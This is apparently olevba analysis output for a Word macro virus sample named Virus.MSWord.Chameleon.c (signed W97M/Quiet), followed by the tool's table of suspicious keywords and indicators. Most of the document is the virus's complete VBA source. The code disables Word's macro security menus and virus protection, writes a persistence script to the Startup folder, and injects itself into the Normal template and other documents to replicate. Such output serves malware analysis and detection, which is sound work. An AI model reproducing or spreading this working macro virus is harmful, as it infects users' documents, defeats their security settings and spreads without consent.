olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Chameleon.c
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.Chameleon.c 
in file: ./Virus.MSWord.Chameleon.c - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = (Rnd * 0)
    Else
        CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
        CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = (Rnd * 0)
        CommandBars("Format").Controls("Style Gallery...").Enabled = (Rnd * 0)
    End If
    Application.EnableCancelKey = (Rnd * 0)
    Set td = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
    Open "C:\Windows\System\Quiet.dll" For Output As #1
        Print #1, td.Lines(1, td.CountOfLines)
    Close #1
    Open "C:\Windows\Start Menu\Programs\Startup\Quiet.vbs" For Output As #1
        Print #1, "' W97M/Quiet"
        Print #1, "'    by: Total Konfuzion"
        Print #1, "Set mw=WScript.CreateObject(""Word.Application"")"
        Print #1, "Set nt=mw.NormalTemplate.VBProject.VBComponents(1).CodeModule"
        Print #1, "nt.AddFromFile(""C:\Windows\System\Quiet.dll"")"
        Print #1, "mw.Options.VirusProtection = (Rnd * 0)"
        Print #1, "mw.Options.ConfirmConversions = (Rnd * 0)"
        Print #1, "mw.Options.SaveNormalPrompt = (Rnd * 0)"
        Print #1, "mw.Options.SavePropertiesPrompt = (Rnd * 0)"
        Print #1, "nt.InsertLines 16,""If ThisDocument=ActiveDocument Then Set i=NormalTemplate Else Set i=ActiveDocument"""
        Print #1, "nt.InsertLines 17,""Vx=ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1,ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"""
        Print #1, "nt.InsertLines 18,""Set d=i.VBProject.VBComponents.Item(1).CodeModule"""
        Print #1, "nt.InsertLines 19,""d.DeleteLines 1,d.CountOfLines"""
        Print #1, "nt.InsertLines 20,""d.AddFromString Vx"""
        Print #1, "nt.InsertLines 21,""ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 16, 7"""
        Print #1, "nt.InsertLines 22,""ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument"""
    Close #1
End Sub
Sub AutoExit()
    Call AutoClose
'W97M/Quiet
'   by: Total Konfuzion
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Quiet.dll           |Executable file name                         |
|IOC       |Quiet.vbs           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

